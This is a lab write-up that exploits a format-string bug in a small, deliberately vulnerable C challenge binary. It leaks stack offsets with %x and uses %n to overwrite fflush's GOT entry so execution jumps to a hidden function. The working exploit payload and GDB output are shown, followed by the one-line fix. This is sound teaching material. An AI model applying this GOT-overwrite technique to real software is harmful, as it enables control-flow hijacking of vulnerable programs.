Let's take a look at the source code...

```
#include <stdlib.h>
#include <stdio.h>

int main()
{
	fun0();
}

void fun0()
{
	puts("Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.\n");
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf(buf0);
	fflush(buf0);
}

void fire_exit()
{
	printf("Oh look, a fire exit. That's why we are still underbugdget. Level Cleared \n");
}
```

So looking at this code, we see that the objective is to run the fire_exit function. However there isn't anywhere in the code that directly calls thay function. However after the insecure printf call, we can see a fflush() function call. We can craft a format string exploit to overwrite the address of the fflush variable with that of the fire_exit() function, thus when when the binary tries to run the fflush function it will just run the fire_exit() function. First thing we will need is the address of the fire_exit() function.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ objdump -t f4 | grep fire_exit
0804853d g     F .text	00000019              fire_exit
```

So we now have the address of the fire_exit() function, which is 0x0804853d. Now we need to find the address of the fflush function. Since fflush is in libc (which is a shared library), it is a dynamic object and we can view it with objdump.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ objdump -R f4 | grep fflush
0804a010 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

So now we have the address of the fflush function, which is 0x0804a010, we now need to find out where our input is stored on the stack. It shouldn't be too far away.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ python -c 'print "0000" + ".%x"*20' | ./f4
Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.

0000.64.f7fb45a0.f0b5ff.ffffd02e.1.c2.30303030.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e
^C
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ 
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ python -c 'print "0000" + "%7$x"' | ./f4
Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.

000030303030
^C
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ 
```

So we now know our input is stored 7 stack values away. Let's try to overwrite the address of the fflush function without any regards as to what we overwrite it with, as a proof of concept.

```
root@tux:/Hackery/escape/fmt_str/f4# python -c 'print "\x10\xa0\x04\x08" + "%7$n"' > pwn_concept
root@tux:/Hackery/escape/fmt_str/f4# exit
exit
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ gdb ./f4
```

One wall of text later...

```
gdb-peda$ r < pwn_concept
```

One more wall of text later...

```
Stopped reason: SIGSEGV
0x00000004 in ?? ()
gdb-peda$ 
```

So we can see that the program tried to execute an instruction at the address 0x00000004, and because that is not a valid address we got the SIGSEV error. So we proved that we can overwrite the value, and since we only wrote a 32 hex bit address (which are only four bytes) printf wrote the decimal value 4 to the location since the -n flag will write for how many bytes we give it. To write the address we will need to, we will just need to take the address 0x0804853d, subtract 4 from it and write as many bytes as we get from that difference using the -x flag.

```
>>> 0x0804853d - 4
134513977
```

So we will need to write 134513977 bytes in order to get the write address. So our final exploit ends up looking like this.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ python -c 'print "\x10\xa0\x04\x08" + "%134513977x" + "%7$n"' | ./f4
```

Once you run it, it should take like a half a minute to a couple of minutes to run (depends if your run it on a Poweredge or Raspberry Pi) since it is writing a metric butt ton worth of bytes to that one address. However after the wait, you should get this lovely message.

```
Oh look, a fire exit. That's why we are still underbugdget. Level Cleared 
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ 
```  

And just like that, we pwned the binary. Now let's patch it.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ cat f4_secure.c
#include <stdlib.h>
#include <stdio.h>

int main()
{
	fun0();
}

void fun0()
{
	puts("Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.\n");
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf("%s", buf0);
	fflush(buf0);
}

void fire_exit()
{
	printf("Oh look, a fire exit. That's why we are still underbugdget. Level Cleared \n");
}
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ python -c 'print "0000" + ".%x"*20' | ./f4_secure 
Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.

0000.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
^C
guyinatuxedo@tux:/Hackery/escape/fmt_str/f4$ 
```
And just like that, we patched the binary.
